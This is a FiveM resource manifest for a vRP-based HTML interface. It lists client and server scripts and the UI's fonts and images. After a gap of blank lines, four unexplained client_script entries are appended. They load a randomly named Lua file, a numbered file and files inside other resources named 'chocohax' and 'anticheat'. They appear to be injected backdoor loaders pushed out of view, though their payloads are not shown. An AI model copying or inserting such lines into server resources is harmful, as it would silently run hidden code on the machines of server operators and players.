
ui_page('client/html/UI.html') --THIS IS IMPORTENT


dependency "vrp"

client_scripts{ 
	"lib/Tunnel.lua",
	"lib/Proxy.lua",
	"client/client.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}


--[[The following is for the files which are need for you UI (like, pictures, the HTML file, css and so on) ]]--
files {
	'client/html/UI.html',
    'client/html/style.css',
    'client/html/media/font/Bariol_Regular.otf',
    'client/html/media/font/Vision-Black.otf',
    'client/html/media/font/Vision-Bold.otf',
    'client/html/media/font/Vision-Heavy.otf',
    'client/html/media/img/bg.png',
    'client/html/media/img/circle.png',
    'client/html/media/img/curve.png',
    'client/html/media/img/fingerprint.png',
    'client/html/media/img/fingerprint.jpg',
    'client/html/media/img/graph.png',
    'client/html/media/img/logo-big.png',
    'client/html/media/img/logo-top.png'
}

client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'